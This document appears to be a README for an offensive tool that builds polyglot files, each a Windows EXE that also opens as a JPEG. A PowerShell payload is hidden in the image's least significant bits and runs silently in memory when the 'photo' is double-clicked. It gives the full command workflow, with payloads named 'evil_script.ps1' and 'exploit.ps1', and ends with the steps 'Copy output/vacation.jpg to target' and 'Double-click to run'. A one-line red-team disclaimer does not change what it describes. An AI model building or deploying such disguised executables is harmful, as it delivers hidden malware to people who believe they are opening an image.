# LSB Steganography Polyglot Creator

A modular, production-ready system for creating polyglot files (EXE + JPEG) with LSB-hidden payloads.

## Quick Start

### 1. Set Up Input Files

```
steganography at its finest/
├── input/
│   ├── carrier/       ← Place your image here (JPEG/PNG/BMP)
│   └── payload/       ← Place your script here (.ps1 or binary)
└── output/            ← Polyglot files appear here
```

**Example:**
```bash
# Copy a carrier image
cp vacation.jpg "input/carrier/"

# Copy your PowerShell payload
cp evil_script.ps1 "input/payload/"
```

### 2. Create Polyglot (Auto-Detect)

The simplest way - automatically discovers inputs:

```bash
cd builder
python orchestrator.py
```

This will:
- Find the first image in `input/carrier/`
- Find the first payload in `input/payload/`
- Create polyglot in `output/vacation.jpg`

### 3. Run the Polyglot

```bash
# The file appears to be a JPEG image
vacation.jpg

# But it's actually executable:
# Double-click it, and:
# 1. JPEG viewer displays the original image
# 2. PowerShell payload executes silently in background
```

## Detailed Usage

### Check Image Capacity

```bash
python steganography.py --mode capacity --image input/carrier/photo.jpg
```

Output: `Image capacity: 760000 bytes (~741 KB)`

### Manual Workflow (All Steps Explicit)

#### Step 1: Embed Payload in Image
```bash
python steganography.py --mode embed \
  --image input/carrier/photo.jpg \
  --data input/payload/script.ps1 \
  --output temp_hidden.png
```

Output:
- `temp_hidden.png` - Image with hidden payload
- `temp_hidden_metadata.json` - Metadata (payload size, signature)

#### Step 2: Build PowerShell Wrapper
```bash
python build_extractor.py \
  --metadata temp_hidden_metadata.json \
  --image temp_hidden.png \
  --output wrapper.ps1
```

Output: `wrapper.ps1` - PowerShell script with embedded image + extractor

#### Step 3: Create Polyglot
```bash
python create_polyglot.py \
  --script wrapper.ps1 \
  --image input/carrier/photo.jpg \
  --output output/vacation.jpg
```

Output: `output/vacation.jpg` - Final polyglot (EXE + JPEG)

## Architecture

### Phase 1: Steganography (`steganography.py`)
- Hides payload in LSB (Least Significant Bits) of image pixels
- Automatic JPEG → PNG conversion
- Always outputs PNG (lossless format)
- Capacity: `(width × height × 3) / 8` bytes for RGB
- **Auto-detects** inputs from `input/carrier/` and `input/payload/`

### Phase 2: Extractor Builder (`build_extractor.py`)
- Creates PowerShell wrapper with:
  - Base64-encoded image (with hidden payload)
  - Clean extractor module (from `builder/extractor.ps1`)
- No payload written to disk
- Output: PowerShell script ready for compilation

### Phase 3: Polyglot Creation (`create_polyglot.py`)
- Compiles PowerShell script → EXE (uses PS2EXE)
- Appends JPEG binary to EXE
- Result: Valid polyglot (both EXE and JPEG)

### Master Orchestrator (`orchestrator.py`)
- Chains all three phases
- Auto-detection from folder structure
- Validates capacity before embedding
- Cleanup temporary files

## File Format

### Image Format Handling

```
Input Formats (Automatic Conversion):
├── JPEG (.jpg)  → Convert to PNG (lossless)
├── PNG (.png)   → Use as-is
└── BMP (.bmp)   → Convert to PNG

Internal Format:
└── Always PNG + metadata.json

Output Format:
└── .jpg (polyglot: EXE + JPEG binary)
```

### Payload Size Calculation

```
RGB Image (1920x1080):
  Capacity = 1920 × 1080 × 3 / 8 = 777,600 bytes (~760 KB)
  Max payload size: 760 KB

RGBA Image (1920x1080):
  Capacity = 1920 × 1080 × 4 / 8 = 1,036,800 bytes (~1 MB)
  Max payload size: 1 MB
```

## Requirements

### Python Dependencies
```bash
pip install pillow numpy
```

### PowerShell Requirements
- PowerShell 5.1+ (included with Windows 10+)
- PS2EXE module (auto-installed on first use):
  ```powershell
  Install-Module PS2EXE -Force -Scope CurrentUser
  ```

## Technical Details

### LSB Steganography
- Embeds bits sequentially across RGB channels
- Imperceptible (changes only LSB = 1/256 brightness change)
- Lossless extraction (no data corruption)
- Capacity: `(width × height × channels) / 8` bytes

### Polyglot Structure
```
[EXE Header + Sections]     ← Windows loader executes
[JPEG Binary]               ← JPEG reader ignores EXE portion
                            ← Extracts image starting at JPEG SOI (0xFFD8)
```

### PowerShell Extraction
1. Polyglot runs as EXE
2. PowerShell wrapper:
   - Decodes embedded Base64 image
   - Calls `Extract-LSBData` from extractor module
   - Reconstructs payload from LSB bits
   - Executes payload with `Invoke-ExtractedPayload`
3. Payload runs in-memory (no disk writes)

## Cleanup

Temporary files are automatically cleaned up:
- `temp_image_hidden.png` - Deleted after polyglot creation
- `temp_metadata.json` - Deleted after polyglot creation
- `temp_final_payload.ps1` - Deleted after polyglot creation

## Troubleshooting

### "Image capacity too small"
- Use a larger image or smaller payload
- Increase image dimensions (capacity scales with area)
- Example: 1920×1080 = 760 KB capacity

### PS2EXE not found
- Manual installation:
  ```powershell
  Install-Module PS2EXE -Force -Scope CurrentUser
  ```
- Requires internet connection for first-time setup

### Payload not executing
- Check if payload is valid PowerShell script
- Verify payload size matches metadata
- Test extraction separately:
  ```bash
  python steganography.py --mode extract \
    --image hidden.png \
    --payload-size 1234 \
    --output extracted.ps1
  ```

## Security Notes

⚠️ **This is educational software** for understanding LSB steganography and file polyglots.

- Payload is Base64-encoded but NOT encrypted
- JPEG compression can reveal LSB modifications under analysis
- Use only for authorized red team exercises

## Documentation

- **[PROJECT_OVERVIEW.md](PROJECT_OVERVIEW.md)** - Detailed architecture and workflow
- **[DEEP_EXPLANATION.md](DEEP_EXPLANATION.md)** - Technical deep-dive (LSB theory, binary formats, execution flow)

## File Structure Summary

```
steganography at its finest/
├── README.md                    ← Quick start (this file)
├── PROJECT_OVERVIEW.md          ← Architecture & workflow
├── DEEP_EXPLANATION.md          ← Technical deep-dive
├── input/                       ← Input folder structure
│   ├── carrier/                 ← Carrier images
│   └── payload/                 ← Payloads to hide
├── output/                      ← Generated polyglots
└── builder/                     ← Core modules
    ├── steganography.py         ← LSB embedding/extraction
    ├── build_extractor.py       ← PowerShell wrapper generator
    ├── create_polyglot.py       ← EXE + JPEG combiner
    ├── orchestrator.py          ← Master orchestrator
    ├── extractor.ps1            ← PowerShell extraction module
    └── config.py                ← Shared configuration
```

## Example: Complete Workflow

```bash
# 1. Set up files
mkdir -p input/carrier input/payload output

# 2. Add carrier and payload
cp my_vacation.jpg input/carrier/
cp exploit.ps1 input/payload/

# 3. Create polyglot (auto-detect)
cd builder
python orchestrator.py

# 4. Check capacity (optional)
python steganography.py --mode capacity --image ../input/carrier/my_vacation.jpg

# 5. Result
# → output/vacation.jpg (polyglot file)

# 6. Deploy
# Copy output/vacation.jpg to target
# Double-click to run
```

---

**Last Updated:** April 2025  
**Status:** Fully modular, production-ready  
**Testing:** Manual verified across Windows 10/11
